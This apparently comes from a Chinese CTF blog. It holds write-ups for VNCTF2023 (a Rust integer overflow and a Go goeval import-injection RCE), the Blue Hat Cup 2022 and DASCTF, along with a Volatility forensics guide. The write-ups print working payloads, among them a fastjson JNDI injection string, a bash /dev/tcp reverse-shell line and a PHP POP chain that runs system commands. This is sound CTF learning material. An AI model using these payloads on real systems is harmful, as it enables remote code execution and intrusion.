[{"content":"电子木鱼 一道简单的rust但是好像和rust没有太大的关系。先来看看源码：\nuse actix_files::Files;\ruse actix_web::{\rerror, get, post,\rweb::{self, Json},\rApp, Error, HttpResponse, HttpServer,\r};\ruse once_cell::sync::Lazy;\ruse serde::{Deserialize, Serialize};\ruse std::sync::{Arc, Mutex};\ruse tera::{Context, Tera};\rstatic GONGDE: Lazy\u0026lt;ThreadLocker\u0026lt;i32\u0026gt;\u0026gt; = Lazy::new(|| ThreadLocker::from(0));\r#[derive(Debug, Clone, Default)]\rstruct ThreadLocker\u0026lt;T\u0026gt; {\rvalue: Arc\u0026lt;Mutex\u0026lt;T\u0026gt;\u0026gt;,\r}\rimpl\u0026lt;T: Clone\u0026gt; ThreadLocker\u0026lt;T\u0026gt; {\rfn get(\u0026amp;self) -\u0026gt; T {\rlet mutex = self.value.lock().unwrap();\rmutex.clone()\r}\rfn set(\u0026amp;self, val: T) {\rlet mut mutex = self.value.lock().unwrap();\r*mutex = val;\r}\rfn from(val: T) -\u0026gt; ThreadLocker\u0026lt;T\u0026gt; {\rThreadLocker::\u0026lt;T\u0026gt; {\rvalue: Arc::new(Mutex::new(val)),\r}\r}\r}\r#[derive(Serialize)]\rstruct APIResult {\rsuccess: bool,\rmessage: \u0026amp;'static str,\r}\r#[derive(Deserialize)]\rstruct Info {\rname: String,\rquantity: i32,\r}\r#[derive(Debug, Copy, Clone, Serialize)]\rstruct Payload {\rname: \u0026amp;'static str,\rcost: i32,\r}\rconst PAYLOADS: \u0026amp;[Payload] = \u0026amp;[\rPayload {\rname: \u0026quot;Cost\u0026quot;,\rcost: 10,\r},\rPayload {\rname: \u0026quot;Loan\u0026quot;,\rcost: -1_000,\r},\rPayload {\rname: \u0026quot;CCCCCost\u0026quot;,\rcost: 500,\r},\rPayload {\rname: \u0026quot;Donate\u0026quot;,\rcost: 1,\r},\rPayload {\rname: \u0026quot;Sleep\u0026quot;,\rcost: 0,\r},\r];\r#[get(\u0026quot;/\u0026quot;)]\rasync fn index(tera: web::Data\u0026lt;Tera\u0026gt;) -\u0026gt; Result\u0026lt;HttpResponse, Error\u0026gt; {\rlet mut context = Context::new();\rcontext.insert(\u0026quot;gongde\u0026quot;, \u0026amp;GONGDE.get());\rif GONGDE.get() \u0026gt; 1_000_000_000 {\rcontext.insert(\r\u0026quot;flag\u0026quot;,\r\u0026amp;std::env::var(\u0026quot;FLAG\u0026quot;).unwrap_or_else(|_| \u0026quot;flag{test_flag}\u0026quot;.to_string()),\r);\r}\rmatch tera.render(\u0026quot;index.html\u0026quot;, \u0026amp;context) {\rOk(body) =\u0026gt; Ok(HttpResponse::Ok().body(body)),\rErr(err) =\u0026gt; Err(error::ErrorInternalServerError(err)),\r}\r}\r#[get(\u0026quot;/reset\u0026quot;)]\rasync fn reset() -\u0026gt; Json\u0026lt;APIResult\u0026gt; {\rGONGDE.set(0);\rweb::Json(APIResult {\rsuccess: true,\rmessage: \u0026quot;重开成功，继续挑战佛祖吧\u0026quot;,\r})\r}\r#[post(\u0026quot;/upgrade\u0026quot;)]\rasync fn upgrade(body: web::Form\u0026lt;Info\u0026gt;) -\u0026gt; Json\u0026lt;APIResult\u0026gt; {\rif GONGDE.get() \u0026lt; 0 {\rreturn web::Json(APIResult {\rsuccess: false,\rmessage: \u0026quot;功德都搞成负数了，佛祖对你很失望\u0026quot;,\r});\r}\rif body.quantity \u0026lt;= 0 {\rreturn web::Json(APIResult {\rsuccess: false,\rmessage: \u0026quot;佛祖面前都敢作弊，真不怕遭报应啊\u0026quot;,\r});\r}\rif let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) {\rlet mut cost = payload.cost;\rif payload.name == \u0026quot;Donate\u0026quot; || payload.name == \u0026quot;Cost\u0026quot; {\rcost *= body.quantity;\r}\rif GONGDE.get() \u0026lt; cost as i32 {\rreturn web::Json(APIResult {\rsuccess: false,\rmessage: \u0026quot;功德不足\u0026quot;,\r});\r}\rif cost != 0 {\rGONGDE.set(GONGDE.get() - cost as i32);\r}\rif payload.name == \u0026quot;Cost\u0026quot; {\rreturn web::Json(APIResult {\rsuccess: true,\rmessage: \u0026quot;小扣一手功德\u0026quot;,\r});\r} else if payload.name == \u0026quot;CCCCCost\u0026quot; {\rreturn web::Json(APIResult {\rsuccess: true,\rmessage: \u0026quot;功德都快扣没了，怎么睡得着的\u0026quot;,\r});\r} else if payload.name == \u0026quot;Loan\u0026quot; {\rreturn web::Json(APIResult {\rsuccess: true,\rmessage: \u0026quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖\u0026quot;,\r});\r} else if payload.name == \u0026quot;Donate\u0026quot; {\rreturn web::Json(APIResult {\rsuccess: true,\rmessage: \u0026quot;好人有好报\u0026quot;,\r});\r} else if payload.name == \u0026quot;Sleep\u0026quot; {\rreturn web::Json(APIResult {\rsuccess: true,\rmessage: \u0026quot;这是什么？床，睡一下\u0026quot;,\r});\r}\r}\rweb::Json(APIResult {\rsuccess: false,\rmessage: \u0026quot;禁止开摆\u0026quot;,\r})\r}\r#[actix_web::main]\rasync fn main() -\u0026gt; std::io::Result\u0026lt;()\u0026gt; {\rlet port = std::env::var(\u0026quot;PORT\u0026quot;)\r.unwrap_or_else(|_| \u0026quot;2333\u0026quot;.to_string())\r.parse()\r.expect(\u0026quot;Invalid PORT\u0026quot;);\rprintln!(\u0026quot;Listening on 0.0.0.0:{}\u0026quot;, port);\rHttpServer::new(move || {\rlet tera = match Tera::new(\u0026quot;src/templates/**/*.html\u0026quot;) {\rOk(t) =\u0026gt; t,\rErr(e) =\u0026gt; {\rprintln!(\u0026quot;Error: {}\u0026quot;, e);\r::std::process::exit(1);\r}\r};\rApp::new()\r.app_data(web::Data::new(tera))\r.service(Files::new(\u0026quot;/asset\u0026quot;, \u0026quot;src/templates/asset/\u0026quot;).prefer_utf8(true))\r.service(index)\r.service(upgrade)\r.service(reset)\r})\r.bind((\u0026quot;0.0.0.0\u0026quot;, port))?\r.run()\r.await\r}\r审计完之后发现GONGDE能够大于1_000_000_000就给flag。关键代码在这里\nif cost != 0 {\rGONGDE.set(GONGDE.get() - cost as i32);\r}\r如果能够让cost成为一个大负数，就可以控制GONGDE成为一个大正数。结合后面的i32，可以想到整数溢出，所以现在的目的是让cost足够大。\n控制cost的代码：\nif payload.name == \u0026quot;Donate\u0026quot; || payload.name == \u0026quot;Cost\u0026quot; {\rcost *= body.quantity;\r}\rquantity是我们传入的变量之一。那么当quantity足够大时（比如大于2147283647），cost就会产生溢出。\n因此最终传入name=Cost\u0026amp;quantity=214748365时会使cost溢出到-2147483646，从而使GONGDE成为较大的正数。\n这里注意，如果传入的quantity=2147483648，也就是刚好大于i32时，服务器会返回Parse error: number too large to fit in target type.参考下面的解释（大概）\nimage-20230228100743212\rBabyGo 简单的Go沙箱逃逸\n看看源码\npackage main\rimport (\r\u0026quot;encoding/gob\u0026quot;\r\u0026quot;fmt\u0026quot;\r\u0026quot;github.com/PaulXu-cn/goeval\u0026quot;\r\u0026quot;github.com/duke-git/lancet/cryptor\u0026quot;\r\u0026quot;github.com/duke-git/lancet/fileutil\u0026quot;\r\u0026quot;github.com/duke-git/lancet/random\u0026quot;\r\u0026quot;github.com/gin-contrib/sessions\u0026quot;\r\u0026quot;github.com/gin-contrib/sessions/cookie\u0026quot;\r\u0026quot;github.com/gin-gonic/gin\u0026quot;\r\u0026quot;net/http\u0026quot;\r\u0026quot;os\u0026quot;\r\u0026quot;path/filepath\u0026quot;\r\u0026quot;strings\u0026quot;\r)\rtype User struct {\rName string\rPath string\rPower string\r}\rfunc main() {\rr := gin.Default()\rstore := cookie.NewStore(random.RandBytes(16))\rr.Use(sessions.Sessions(\u0026quot;session\u0026quot;, store))\rr.LoadHTMLGlob(\u0026quot;template/*\u0026quot;)\rr.GET(\u0026quot;/\u0026quot;, func(c *gin.Context) {\ruserDir := \u0026quot;./\u0026quot; + cryptor.Md5String(c.ClientIP()+\u0026quot;VNCTF2023GoGoGo~\u0026quot;) + \u0026quot;/\u0026quot;\rsession := sessions.Default(c)\rsession.Set(\u0026quot;shallow\u0026quot;, userDir)\rsession.Save()\rfileutil.CreateDir(userDir)\rgobFile, _ := os.Create(userDir + \u0026quot;user.gob\u0026quot;)\ruser := User{Name: \u0026quot;ctfer\u0026quot;, Path: userDir, Power: \u0026quot;low\u0026quot;}\rencoder := gob.NewEncoder(gobFile)\rencoder.Encode(user)\rif fileutil.IsExist(userDir) \u0026amp;\u0026amp; fileutil.IsExist(userDir+\u0026quot;user.gob\u0026quot;) {\rc.HTML(200, \u0026quot;index.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;Your path: \u0026quot; + userDir})\rreturn\r}\rc.HTML(500, \u0026quot;index.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;failed to make user dir\u0026quot;})\r})\rr.GET(\u0026quot;/upload\u0026quot;, func(c *gin.Context) {\rc.HTML(200, \u0026quot;upload.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;upload me!\u0026quot;})\r})\rr.POST(\u0026quot;/upload\u0026quot;, func(c *gin.Context) {\rsession := sessions.Default(c)\rif session.Get(\u0026quot;shallow\u0026quot;) == nil {\rc.Redirect(http.StatusFound, \u0026quot;/\u0026quot;)\r}\ruserUploadDir := session.Get(\u0026quot;shallow\u0026quot;).(string) + \u0026quot;uploads/\u0026quot;\rfileutil.CreateDir(userUploadDir)\rfile, err := c.FormFile(\u0026quot;file\u0026quot;)\rif err != nil {\rc.HTML(500, \u0026quot;upload.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;no file upload\u0026quot;})\rreturn\r}\rext := file.Filename[strings.LastIndex(file.Filename, \u0026quot;.\u0026quot;):]\rif ext == \u0026quot;.gob\u0026quot; || ext == \u0026quot;.go\u0026quot; {\rc.HTML(500, \u0026quot;upload.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;Hacker!\u0026quot;})\rreturn\r}\rfilename := userUploadDir + file.Filename\rif fileutil.IsExist(filename) {\rfileutil.RemoveFile(filename)\r}\rerr = c.SaveUploadedFile(file, filename)\rif err != nil {\rc.HTML(500, \u0026quot;upload.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;failed to save file\u0026quot;})\rreturn\r}\rc.HTML(200, \u0026quot;upload.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;file saved to \u0026quot; + filename})\r})\rr.GET(\u0026quot;/unzip\u0026quot;, func(c *gin.Context) {\rsession := sessions.Default(c)\rif session.Get(\u0026quot;shallow\u0026quot;) == nil {\rc.Redirect(http.StatusFound, \u0026quot;/\u0026quot;)\r}\ruserUploadDir := session.Get(\u0026quot;shallow\u0026quot;).(string) + \u0026quot;uploads/\u0026quot;\rfiles, _ := fileutil.ListFileNames(userUploadDir)\rdestPath := filepath.Clean(userUploadDir + c.Query(\u0026quot;path\u0026quot;))\rfor _, file := range files {\rif fileutil.MiMeType(userUploadDir+file) == \u0026quot;application/zip\u0026quot; {\rerr := fileutil.UnZip(userUploadDir+file, destPath)\rif err != nil {\rc.HTML(200, \u0026quot;zip.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;failed to unzip file\u0026quot;})\rreturn\r}\rfileutil.RemoveFile(userUploadDir + file)\r}\r}\rc.HTML(200, \u0026quot;zip.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;success unzip\u0026quot;})\r})\rr.GET(\u0026quot;/backdoor\u0026quot;, func(c *gin.Context) {\rsession := sessions.Default(c)\rif session.Get(\u0026quot;shallow\u0026quot;) == nil {\rc.Redirect(http.StatusFound, \u0026quot;/\u0026quot;)\r}\ruserDir := session.Get(\u0026quot;shallow\u0026quot;).(string)\rif fileutil.IsExist(userDir + \u0026quot;user.gob\u0026quot;) {\rfile, _ := os.Open(userDir + \u0026quot;user.gob\u0026quot;)\rdecoder := gob.NewDecoder(file)\rvar ctfer User\rdecoder.Decode(\u0026amp;ctfer)\rif ctfer.Power == \u0026quot;admin\u0026quot; {\reval, err := goeval.Eval(\u0026quot;\u0026quot;, \u0026quot;fmt.Println(\\\u0026quot;Good\\\u0026quot;)\u0026quot;, c.DefaultQuery(\u0026quot;pkg\u0026quot;, \u0026quot;fmt\u0026quot;))\rif err != nil {\rfmt.Println(err)\r}\rc.HTML(200, \u0026quot;backdoor.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: string(eval)})\rreturn\r} else {\rc.HTML(200, \u0026quot;backdoor.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;low power\u0026quot;})\rreturn\r}\r} else {\rc.HTML(500, \u0026quot;backdoor.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;no such user gob\u0026quot;})\rreturn\r}\r})\rr.Run(\u0026quot;:80\u0026quot;)\r}\r具体思路是通过上传包含user.gob的zip压缩包，然后访问unzip让其解压到对应目录下面，最后通过访问backdoor，判断user.gob内含的user信息是否是admin，如果是admin就进入eval进行rce。\n简单记录一下goeval的rce 拿到goeval的源码：\npackage goeval\rimport (\r\u0026quot;fmt\u0026quot;\r\u0026quot;go/format\u0026quot;\r\u0026quot;math/rand\u0026quot;\r\u0026quot;os\u0026quot;\r\u0026quot;os/exec\u0026quot;\r\u0026quot;strings\u0026quot;\r\u0026quot;time\u0026quot;\r)\rconst (\rletterBytes = \u0026quot;abcdefghijklmnopqrstuvwxyz\u0026quot;\rletterIdxBits = 6 // 6 bits to represent a letter index\rletterIdxMask = 1\u0026lt;\u0026lt;letterIdxBits - 1 // All 1-bits, as many as letterIdxBits\rletterIdxMax = 63 / letterIdxBits // # of letter indices fitting in 63 bits\r)\rvar (\rdirSeparator = \u0026quot;/\u0026quot;\rtempDir = os.TempDir()\rsrc = rand.NewSource(time.Now().UnixNano())\r)\r// 参考： https://colobu.com/2018/09/02/generate-random-string-in-Go/\rfunc RandString(n int) string {\rb := make([]byte, n)\r// A src.Int63() generates 63 random bits, enough for letterIdxMax characters!\rfor i, cache, remain := n-1, src.Int63(), letterIdxMax; i \u0026gt;= 0; {\rif remain == 0 {\rcache, remain = src.Int63(), letterIdxMax\r}\rif idx := int(cache \u0026amp; letterIdxMask); idx \u0026lt; len(letterBytes) {\rb[i] = letterBytes[idx]\ri--\r}\rcache \u0026gt;\u0026gt;= letterIdxBits\rremain--\r}\rreturn string(b)\r}\rfunc Eval(defineCode string, code string, imports ...string) (re []byte, err error) {\rvar (\rtmp = `package main\r%s\r%s\rfunc main() {\r%s\r}\r`\rimportStr string\rfullCode string\rnewTmpDir = tempDir + dirSeparator + RandString(8)\r)\rif 0 \u0026lt; len(imports) {\rimportStr = \u0026quot;import (\u0026quot;\rfor _, item := range imports {\rif blankInd := strings.Index(item, \u0026quot; \u0026quot;); -1 \u0026lt; blankInd {\rimportStr += fmt.Sprintf(\u0026quot;\\n %s \\\u0026quot;%s\\\u0026quot;\u0026quot;, item[:blankInd], item[blankInd+1:])\r} else {\rimportStr += fmt.Sprintf(\u0026quot;\\n\\\u0026quot;%s\\\u0026quot;\u0026quot;, item)\r}\r}\rimportStr += \u0026quot;\\n)\u0026quot;\r}\rfullCode = fmt.Sprintf(tmp, importStr, defineCode, code)\rvar codeBytes = []byte(fullCode)\r// 格式化输出的代码\rif formatCode, err := format.Source(codeBytes); nil == err {\r// 格式化失败，就还是用 content 吧\rcodeBytes = formatCode\r}\r// 创建目录\rif err = os.Mkdir(newTmpDir, os.ModePerm); nil != err {\rreturn\r}\rdefer os.RemoveAll(newTmpDir)\r// 创建文件\rtmpFile, err := os.Create(newTmpDir + dirSeparator + \u0026quot;main.go\u0026quot;)\rif err != nil {\rreturn re, err\r}\rdefer os.Remove(tmpFile.Name())\r// 代码写入文件\rtmpFile.Write(codeBytes)\rtmpFile.Close()\r// 运行代码\rcmd := exec.Command(\u0026quot;go\u0026quot;, \u0026quot;run\u0026quot;, tmpFile.Name())\rres, err := cmd.CombinedOutput()\rreturn res, err\r}\r关键代码：\nvar (\rtmp = `package main\r%s\r%s\rfunc main() {\r%s\r}\r`\rimportStr string\rfullCode string\rnewTmpDir = tempDir + dirSeparator + RandString(8)\r)\rif 0 \u0026lt; len(imports) {\rimportStr = \u0026quot;import (\u0026quot;\rfor _, item := range imports {\r// 碰到第一个空格就在它后面加双引号\rif blankInd := strings.Index(item, \u0026quot; \u0026quot;); -1 \u0026lt; blankInd {\rimportStr += fmt.Sprintf(\u0026quot;\\n %s \\\u0026quot;%s\\\u0026quot;\u0026quot;, item[:blankInd], item[blankInd+1:])\r} else {\rimportStr += fmt.Sprintf(\u0026quot;\\n\\\u0026quot;%s\\\u0026quot;\u0026quot;, item)\r}\r}\rimportStr += \u0026quot;\\n)\u0026quot;\r}\rfullCode = fmt.Sprintf(tmp, importStr, defineCode, code)\r这里是将传入的参数拼接到tmp字符串中，生成一个完整的go文件。所以可以直接拼接代码进去实现rce。\n构造可以执行系统命令的完整go文件：\npackage main\rimport (\r\u0026quot;os/exec\u0026quot;\r\u0026quot;fmt\u0026quot;\r)\rfunc init(){\rcmd := exec.Command(\u0026quot;ls\u0026quot;,\u0026quot;/\u0026quot;)\rres,err := cmd.CombinedOutput()\rfmt.Println(string(res))\rfmt.Println(err)\r}\r由于tmp里面已经有main函数，且函数执行的代码是我们不可控的，因此自行拼接一个init函数，让其在main函数之前被执行。同时为了闭合eval给出的引号，对这一段代码进行修改，给出如下exp：\nos/exec\\\u0026quot;\\n\\\u0026quot;fmt\\\u0026quot;)\\nfunc\\tinit(){\\ncmd\\t:=exec.Command(\\\u0026quot;ls\\\u0026quot;,\\\u0026quot;/\\\u0026quot;)\\nres,err\\t:=\\tcmd.CombinedOutput()\\nfmt.Println(string(res))\\nfmt.Println(err)\\n}\\nconst(\\nMessage=\\\u0026quot;fmt\r在web传参的时候记得url编码。\n吐槽\u0026amp;碎碎念 rust环境真难装，装完发现用不到。\n还有一道php据说很难就没做23333\n最近太焦虑了，心又浮躁的很，在思考该怎么冷静下来\n以及还是没有找到secret，崩溃.jpg\n","date":"2023-03-01T13:34:39+08:00","permalink":"https://koali-www.github.io/2023/vnctf2023web/","title":"VNCTF2023-Web"},{"content":"为了做windows内存取证的题，捣鼓了一下volatility，中途碰到乱七八糟的问题，这里稍微记录一下(●\u0026rsquo;◡\u0026rsquo;●)\n使用\u0026amp;安装volatility出现的一些问题 打包好的.exe文件在windows上运行时会报错：Please install PIL，但我的python2是装好pillow包了的。但其实如果不用到PIL相关的插件，使用上没有太大问题。\nimage-20230212210040516\r在windows上直接使用源码，会导致奇奇怪怪的问题出现，比如已经装好了Crpto包但是告诉我没有这个包。\nimage-20230212205730131\rimage-20230212205916461\rdebian里直接用apt装volatility失败\nimage-20230212210234444\r后来发现volatility2.6只支持2.6.11到5.5的linux内核（人家写readme了是我没看呜呜）\nimage-20230212210527864\r总结是：绝对不要在windows上玩volatility\n从安装python2到volatility2.6 1.debian安装python2 本地装在debian11里面，因为debian11已经找不到pip2这个包了，所以要另外装orz\n如果是其他发行版linux，自行上网找教程叭( •̀ ω •́ )✧\nsed -i \u0026quot;s@http://[^/]*@http://mirrors.tuna.tsinghua.edu.cn@g\u0026quot; /etc/apt/sources.list #换源，如果换过了就跳过\rsudo apt-get install python2 #装python2\rpython2 -V #测试python2是不是装好了\rcurl -o get-pip.py https://bootstrap.pypa.io/pip/2.7/get-pip.py\rpython2 get-pip.py #没有报错的话应该是装好了\rpip2 -V #测试pip2是不是装好了\r2.安装volatility 这里会涉及到python2几个包的安装，如果已经有了可以跳过\n# 安装Crypto包，注意不要直接装Crypto!!!!!\rpip2 install pycryptodome # 装distorm3的时候如果报'Python.h: No such file or directory',是环境里没有这个头文件，所以我们装一下。\rsudo apt-get install python-dev\rpip2 install distorm3 # 插件里会需要PIL包,但这个包已经改名字了,稍微注意一下\rpip2 install pillow\r需要的依赖都安装完以后，去官网把源码拿下来\ngit clone git@github.com:volatilityfoundation/volatility.git\rcd volatility\rpython2 vol.py -h # 如果不报任何错的话应该是可以用了\rimage-20230212150412325\r3.volatility的简单使用（针对windows内存取证分析） python2 vol.py -h # 查看help\rpython2 vol.py -f memory.mem imageinfo # -f指定镜像文件，imageinfo参数查看该镜像的概况\rpython2 vol.py -f memory.mem --profile=Win7SP1x64 # 指定镜像版本，方便后续分析\r在此基础上，列出常用参数——\n0x01 列出进程 如果指定版本是正确的，使用pslist会列出当前镜像的进程\npython2 vol.py -f memory.mem --profile=Win7SP1x64 pslist\r同时可以使用pstree识别子进程和父进程。\n之后可以使用memdump进行进程提取，-p指定PID，-D指定文件保存路径\npython2 vol.py -f memory.mem --profile=Win7SP1x64 memdump -p233 -D ./\r0x02 扫描历史cmd命令 python2 vol.py -f memory.mem --profile=Win7SP1x64 cmdscan\r0x03 扫描文件 扫描镜像中存在的文件，一般配合grep使用\npython2 vol.py -f memory.mem --profile=Win7SP1x64 filescan | grep flag\r扫描到之后会列出文件地址，此时可以通过dumpfiles提取\npython2 vol.py -f memory.mem --profile=Win7SP1x64 dumpfiles -Q [文件地址] -D ./\r0x04 获取用户信息及密码 获取机器上存在的用户\npython2 vol.py -f memory.mem --profile=Win7SP1x64 printkey -K \u0026quot;SAM\\Domains\\Account\\Users\\Names\u0026quot;\r最后登录系统的用户\npython2 vol.py -f memory.mem --profile=Win7SP1x64 printkey -K \u0026quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026quot;\r可以直接拿到镜像的密码hash\npython2 vol.py -f memory.mem --profile=Win7SP1x64 hashdump\r0x05 调取shell python2 vol.py -f memory.mem --profile=Win7SP1x64 volshell\r0x06 屏幕截图 python2 vol.py -f memory.mem --profile=Win7SP1x86 screenshot -D ./\r但是有点鸡肋（）\n","date":"2023-02-12T21:32:29+08:00","permalink":"https://koali-www.github.io/2023/volatilitydiary/","title":"Volatility踩坑日记"},{"content":" 欢 迎 光 临 !\n前几天突然想起自己还有个博客，虽然统共只写了四篇不成文的writeup记录，但好像也能够作为一个可以碎碎念的地方。于是吭哧吭哧开始搭建。原先用的hexo，挑的主题不是很好看，最近逛着逛着发现hugo的stack看起来很舒服，直接拿来用了。很久不敲代码，感觉审计起来很困难，着手装修的路应该会被我拖得老长\u0026hellip;\n主题直接从小球飞鱼提供的仓库照搬,日后有时间再慢慢改。\n原主题基础上的修改 简单配置更改 样式微调 这个mod新增的一些页面内容是写死的，手动调成模板调用 TODO: : 链接页、归档页样式更改 : 添加一些小动画 : 添加一下评论系统（应pyy的push要求） : 重写about页面 : 想到了再说 记录一些四处搜刮来的文章 草稿管理\n写作工具\nhugo建站笔记\n博客日后用途 日常WriteUp记录、技术学习笔记等等（技术博客真难写..希望新年坚持一下） 碎碎念杂记 想到再说 ","date":"2023-02-10T00:37:33+08:00","image":"https://koali-www.github.io/2023/new-blog/87c01ec7gy1fsnqqlbdzjj21kw0w07is_hu6b3641bab08a4d9fcd9c17dbfb8d16cd_176708_120x120_fill_q75_box_smart1.jpg","permalink":"https://koali-www.github.io/2023/new-blog/","title":"锵锵！博客搬新家ヾ(≧▽≦*)o"},{"content":"写在前面 很长时间没打比赛，生疏了很多。蓝帽杯的取证题很友好，好久没做出这么多题了哈哈哈哈哈哈哈哈，和pyy共同表示：虽然写了一堆水题，但是写了很多题！\n不过这里主要记录一下fastjson的jndi注入流程。感谢高表哥的指导( •̀ ω •́ )✧\nEz_gadget fastjson 1.2.62\n需要：\n开启autotype\n导入xbean-reflect-3.4.jar\n入口：\nimage-20220709213554716\r在开始注入之前，需要绕过hashCode()和equals()的比较。java里，String类重写了Object的hashCode：\nimage-20220709214050723\r相关的解释和参考资料网上有很多。通俗来说，因为hashCode返回的是一个int，而且过程是对字符串分组执行加密的，所以解密过程同样可以进行拆分。原理是中间相遇攻击。网上找了生成的代码，拿给定的key直接生成就可以了。\n接下来要考虑绕过正则，json是支持unicode编码的，所以可以把关键的内容用unicode编码代替，这里就全部编码替代了。\n最后是fastjson注入。查看源码可以发现这个项目里导入了xbean-reflect-3.4.jar包，里面的propertyeditor.JndiConverter类有可控点：\nimage-20220709220927698\r经典的jndi注入漏洞点，现成的payload也很多，找一个能用的：\n{\u0026quot;@type\u0026quot;:\u0026quot;org.apache.xbean.propertyeditor.JndiConverter\u0026quot;,\u0026quot;AsText\u0026quot;:\u0026quot;rmi://127.0.0.1:1099/exploit\u0026quot;}\r这里本地环境就直接弹计算器了。弹shell的话把执行命令改成bash -i \u0026gt;\u0026amp; /dev/tcp/xx.xx.xx.xx/1099 0\u0026gt;\u0026amp;1就行了。\n同样也有现成的工具（当然自己搭rmi也可以）\nimage-20220709223610356\rpayload：\nstr=9P5JBmvCKwa8awgNWjY_gmj\u0026amp;input={\u0026quot;@type\u0026quot;:\u0026quot;\\u006f\\u0072\\u0067\\u002e\\u0061\\u0070\\u0061\\u0063\\u0068\\u0065\\u002e\\u0078\\u0062\\u0065\\u0061\\u006e\\u002e\\u0070\\u0072\\u006f\\u0070\\u0065\\u0072\\u0074\\u0079\\u0065\\u0064\\u0069\\u0074\\u006f\\u0072\\u002e\\u004a\\u006e\\u0064\\u0069\\u0043\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u0065\\u0072\u0026quot;,\u0026quot;AsText\u0026quot;:\u0026quot;\\u0072\\u006d\\u0069\\u003a\\u002f\\u002f\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031\\u003a\\u0031\\u0030\\u0039\\u0039\\u002f\\u007a\\u0062\\u007a\\u0077\\u0074\\u0038\u0026quot;}\r参考链接 生成HashCode一致的字符串\n红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现\nFastjson \u0026lt;=1.2.62 远程代码执行-漏洞复现\n浅析Fastjson1.2.62-1.2.68反序列化漏洞\njndi_tool\nJNDI-Injection-Exploit\n如何绕过高版本 JDK 的限制进行 JNDI 注入利用\n深入理解JNDI注入与Java反序列化漏洞利用\n写在最后 java题打的太少了，基本上看到java就放弃了，但是今天一步一步走下来收获还是蛮大的，虽然JNDI注入漏洞还是没有太明白。这一篇稍微记录一下打的过程，之后会开始复现各种JNDI注入的洞，慢慢把分析补上。包括各种工具的使用，在利用点上也有一定区别，这导致今天花了很多时间踩坑，之后一并写到总结里。\n先开个坑，溜啦~\n","date":"2022-07-09T00:00:00Z","permalink":"https://koali-www.github.io/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/","title":"蓝帽杯2022"},{"content":"写在前面 DASCTF没有好好打，作业太多了一直在赶ddl。但是好像确实不是很难的样子，写不出来果然还是我太菜了\u0026hellip;\n以及，希望以后抽空多做做题叭(・∀・(・∀・(・∀・*)\nezpop 先放源码\n\u0026lt;?php\rclass crow\r{\rpublic $v1;\rpublic $v2;\rfunction eval() {\recho new $this-\u0026gt;v1($this-\u0026gt;v2);\r}\rpublic function __invoke()\r{\r$this-\u0026gt;v1-\u0026gt;world();\r}\r}\rclass fin\r{\rpublic $f1;\rpublic function __destruct()\r{\recho $this-\u0026gt;f1 . '114514';\r}\rpublic function run()\r{\r($this-\u0026gt;f1)();\r}\rpublic function __call($a, $b)\r{\recho $this-\u0026gt;f1-\u0026gt;get_flag();\r}\r}\rclass what\r{\rpublic $a;\rpublic function __toString()\r{\r$this-\u0026gt;a-\u0026gt;run();\rreturn 'hello';\r}\r}\rclass mix\r{\rpublic $m1;\rpublic function run()\r{\r($this-\u0026gt;m1)();\r}\rpublic function get_flag()\r{\reval('#' . $this-\u0026gt;m1);\r}\r}\rif (isset($_POST['cmd'])) {\runserialize($_POST['cmd']);\r}\relse{\rhighlight_file(__FILE__);\r}\r太久没有写php的反序列化了，魔术方法怎么触发都忘得差不多了，所以翻出了y4的总结又跟着看了一遍（记性差真的好烦啊）\n__invoke() 在对象被作为函数调用时触发\r__destruct() 在对象被销毁时触发\r__call() 在调用未知或者不可访问的函数时触发\r__toString() 在对象被作为字符串使用时触发(比如打印啦、拼接啦..)\r首先注意到mix类里面的get_flag函数里有一个eval，所以入口应该就是这里。于是可以反推出pop链应该怎么构造。\nget_flag里面有一个eval函数,明显我们需要利用这个点进行命令执行.为了摸到这个eval,需要m1可控,还要执行get_flag();在fin里面调用__call可以使f1调用get_flag(),为了调用__call，可以利用crow里的__invoke，使v1调用未知函数而触发__call;为了调用__invoke,又需要将某个对象作为函数触发，这里可以使用fin的run或者mix的run;为了调用run，需要进到__toString里，但是触发这个__toString()又需要将对象作为字符串调用，所以自然就进入__destruct调用里面的字符串拼接。分析完以上的问题，就可以构造pop链了。\n流程主要是:\rfin::_destruct()\rwhat::__toString()\rfin::run()/mix::run()\rcrow::__invoke()\rfin::__call()\rmix::get_flag()\r所以定义如下的变量（也可以直接重新构造类）\n$mix = new mix();\r$mix-\u0026gt;m1 = \u0026quot;\\nsystem('whoami');\u0026quot;; // m1是需要拼接进eval的命令。\r$fin3 = new fin();\r$fin3-\u0026gt;f1 = $mix;\r$crow = new crow();\r$crow-\u0026gt;v1 = $fin3;\r//$mix2 = new mix(); //$mix2-\u0026gt;m1 = $crow;\r$fin2 = new fin(); // 这里的fin2换成上面的mix2同样可以实现，效果一样的\r$fin2-\u0026gt;f1 = $crow;\r$what = new what();\r$what-\u0026gt;a = $fin2;\r$fin = new fin();\r$fin-\u0026gt;f1 = $what;\recho serialize($fin);\runserialize(serialize($fin));\r这里有一个点是eval里面拼接了注释符号#，为了绕过这个注释，可以写入\\n来绕过。不过有一点比较坑的是hackbar不能传进换行，好像burp也不行，所以最后采用python发包打的远程。以及在这里遇到了php单引号和双引号字符转义的问题，我一定是最后一个知道php的单引号内字符串只转义斜杠和单引号的叭55555\n对了，目录下面有很多的文件，其实只要执行cat *，或者cat `ls` 